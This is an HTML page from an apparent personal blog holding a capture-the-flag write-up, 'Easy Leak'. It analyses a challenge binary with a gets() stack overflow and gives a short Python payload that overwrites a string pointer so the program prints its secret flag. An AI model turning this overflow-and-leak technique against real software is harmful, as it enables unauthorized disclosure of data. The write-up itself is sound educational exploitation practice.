<!doctype html>
<html lang="en-us">
  <head>
    <title>Easy Leak // R1x0n</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.89.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="http://127.0.0.1:1313/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Easy Leak"/>
<meta name="twitter:description" content="## Goal of the exercise Have the program to print the contents of the flag file. ## Research And Reverse Engineering Test See if there are any protections: It appears to be only “NX” enabled. Decompiled C code of the executable: int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp&#43;0h] [rbp-50h]  char s1; // [rsp&#43;10h] [rbp-40h]  char *s; // [rsp&#43;30h] [rbp-20h]  const char *v6; // [rsp&#43;38h] [rbp-18h]  const char *v7; // [rsp&#43;40h] [rbp-10h]  unsigned __int64 v8; // [rsp&#43;48h] [rbp-8h]  v8 = __readfsqword(0x28u); memset(&amp;s1, 0, 0x38uLL); s = &#34;[!"/>

    <meta property="og:title" content="Easy Leak" />
<meta property="og:description" content="## Goal of the exercise Have the program to print the contents of the flag file. ## Research And Reverse Engineering Test See if there are any protections: It appears to be only “NX” enabled. Decompiled C code of the executable: int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { FILE *stream; // [rsp&#43;0h] [rbp-50h]  char s1; // [rsp&#43;10h] [rbp-40h]  char *s; // [rsp&#43;30h] [rbp-20h]  const char *v6; // [rsp&#43;38h] [rbp-18h]  const char *v7; // [rsp&#43;40h] [rbp-10h]  unsigned __int64 v8; // [rsp&#43;48h] [rbp-8h]  v8 = __readfsqword(0x28u); memset(&amp;s1, 0, 0x38uLL); s = &#34;[!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://127.0.0.1:1313/posts/cyber-challenge/easy-leak/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-06-13T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-06-13T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="http://127.0.0.1:1313"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
      <h1>R1x0n</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc vehicula turpis sit amet elit pretium.</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Easy Leak</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jun 13, 2019
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          2 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="http://127.0.0.1:1313/tags/binary-exploit/">Binary-Exploit</a>
              <a class="tag" href="http://127.0.0.1:1313/tags/writeup/">Writeup</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <link rel="stylesheet" type="text/css" href="/static/css/style.css">
## Goal of the exercise
Have the program to print the contents of the flag file.
## Research And Reverse Engineering Test
See if there are any protections:
<img src="/posts/cyber-challenge/static/checksec.png" width="50%" height="50%" align="center" class="center">
It appears to be only “NX” enabled.
<h2 id="decompiled-c-code-of-the-executable">Decompiled C code of the executable:</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  FILE <span style="color:#f92672">*</span>stream; <span style="color:#75715e">// [rsp+0h] [rbp-50h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s1; <span style="color:#75715e">// [rsp+10h] [rbp-40h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [rsp+30h] [rbp-20h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// [rsp+38h] [rbp-18h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// [rsp+40h] [rbp-10h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+48h] [rbp-8h]
</span><span style="color:#75715e"></span>
  v8 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  memset(<span style="color:#f92672">&amp;</span>s1, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x38uLL</span>);
  s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[!] Flag not found!&#34;</span>;
  v6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[!] I was not able to read the flag!&#34;</span>;
  v7 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[!] Wrong! You should really make better guesses. This one was really poor. I bet you can do better. Try againg.&#34;</span>;
  stream <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;./flag&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>);
  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>stream )
  {
    puts(s);
    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
  }
  fread(flag, <span style="color:#ae81ff">1024uLL</span>, <span style="color:#ae81ff">1uLL</span>, stream);
  puts(<span style="color:#e6db74">&#34;Guess the flag!&#34;</span>);
  gets(<span style="color:#f92672">&amp;</span>s1, <span style="color:#ae81ff">1024LL</span>);
  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strncmp(<span style="color:#f92672">&amp;</span>s1, flag, <span style="color:#ae81ff">1024uLL</span>) )
    printf(<span style="color:#e6db74">&#34;Great Job!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Here is the flag %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag, stream);
  <span style="color:#66d9ef">else</span>
    printf(<span style="color:#e6db74">&#34; %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v7, stream);
  exit(<span style="color:#ae81ff">0</span>);
}
</code></pre></div><h3 id="highlight-the-most-important-things">Highlight the most important things:</h3>
<ul>
<li>*v7 is a pointer</li>
<li>*v7 points to a string in memory</li>
<li>We write in s1</li>
<li>The program will always print * v7</li>
</ul>
<h3 id="lets-try-the-program">Let’s try the program:</h3>
<img src="/posts/cyber-challenge/static/program.png" width="1000%" height="100%" align="center" class="center">
Actually the program printed the string to which *v7 points.
<h2 id="actual-analysis-and-exploitation-begins-here">Actual Analysis And Exploitation Begins Here</h2>
<p>Let’s try to take control of “RIP” using a Cyclic string:
<img src="/posts/cyber-challenge/static/ripReg.png" width="70%" height="70%" align="center" class="center">
The program goes into error due to a fault address, but apparently it is not the value we entered.
We can check it with a Cyclic query:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rixon@killer-VirtualBox:~/Desktop/challenge/easyleak$ cyclic -l 0x7ffff7a5bcc0
<span style="color:#f92672">[</span>CRITICAL<span style="color:#f92672">]</span> Subpattern must be <span style="color:#ae81ff">4</span> bytes
</code></pre></div><p>This shows the presence of control on the stack!</p>
<h2 id="assembly-code-analysis">Assembly code analysis</h2>
<img src="/posts/cyber-challenge/static/assembly.png" width="70%" height="70%" align="center" class="center">
<p>Pointers are initialized in the red outline, in sequence:</p>
<ul>
<li>char *s = 0x40087f</li>
<li>char *v6 = 0x400898</li>
<li>char *v7 = 0x4008c0</li>
</ul>
<p>So our goal is to change &ldquo;0x4008c0&rdquo; in something else.</p>
<h3 id="lets-see-how">Let&rsquo;s see how</h3>
<img src="/posts/cyber-challenge/static/strncmp.png" width="50%" height="50%" align="center" class="center">
The "strncmp" is done in the red outline, so the flag value is in this memory zone. Precisely in "0x6010a0".
<p>Let&rsquo;s see where these values are stored in memory thanks to a breakpoint immediately after the &ldquo;gets&rdquo;:
<img src="/posts/cyber-challenge/static/value.png" width="50%" height="50%" align="center" class="center"></p>
<h3 id="so-the-script-we-need-is-the-following-xpy">So the script we need is the following (x.py):</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> sys 
junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>
leak_address <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x6010a0</span>)
payload <span style="color:#f92672">=</span> junk<span style="color:#f92672">+</span>leak_address
print(payload)
sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
</code></pre></div><h3 id="the-result-of-the-script-its-the-following">The result of the script it&rsquo;s the following:</h3>
<img src="/posts/cyber-challenge/static/flag.png" width="70%" height="70%" align="center" class="center">
As we can see now the program prints the flag value.
<h2 id="job-done">JOB DONE!</h2>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
